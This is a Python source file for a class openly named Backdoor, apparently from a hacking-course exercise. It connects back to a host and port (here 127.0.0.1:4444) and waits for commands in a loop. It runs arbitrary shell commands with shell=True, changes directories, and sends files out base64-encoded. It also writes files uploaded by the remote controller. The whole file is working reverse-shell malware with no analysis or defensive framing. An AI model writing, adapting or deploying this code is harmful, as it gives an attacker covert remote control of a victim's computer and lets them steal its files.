import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        self.connection.send(json.dumps(data).encode())

    def reliable_receive(self):
        return json.loads(self.connection.recv(1024).decode())

    def change_working_directory_to(self, path):
        os.chdir(path)
        return f"[+] Changed working directory to {path}"

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, text=True)

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Download successfully."

    def run(self):
        while True:
            try:
                command = self.reliable_receive()
                if command[0] == "exit":
                    self.connection.close()
                    exit()

                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])

                elif command[0] == "download":
                    command_result = self.read_file(command[1])

                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])

                else:
                    command_result = self.execute_system_command(command)

                self.reliable_send(command_result)
            except Exception as e:
                self.reliable_send(f"[-] Error: {str(e)}")


my_backdoor = Backdoor("127.0.0.1", 4444)
my_backdoor.run()
